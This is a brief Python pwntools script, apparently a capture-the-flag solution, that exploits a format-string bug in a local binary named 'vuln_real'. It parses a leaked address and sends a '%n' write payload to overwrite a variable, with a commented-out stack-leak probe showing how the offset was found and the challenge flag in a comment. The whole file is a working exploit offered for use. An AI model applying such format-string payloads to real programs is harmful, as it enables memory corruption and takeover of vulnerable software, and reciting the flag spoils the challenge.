#!/usr/bin/python3
# this works 9/10 times lol
# just try again if it fails and let ASLR run its magic
# SKYLIGHT{stiLL_b3tt3r_formatt1ng_than_MS_Word}
import pwn
pwn.context.log_level = 'debug'
p = pwn.process("vuln_real")
p.recvuntil("@ ")
i_addr = pwn.p32(int(p.recvline().strip(), 16))
# this is how i discovered the right offset to use
# (leak a whole bunch of the stack and manually look for the address of i)
# p.sendline(i_addr+b"|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x")
p.sendline(i_addr+b"%.995x%7$n")
p.interactive()
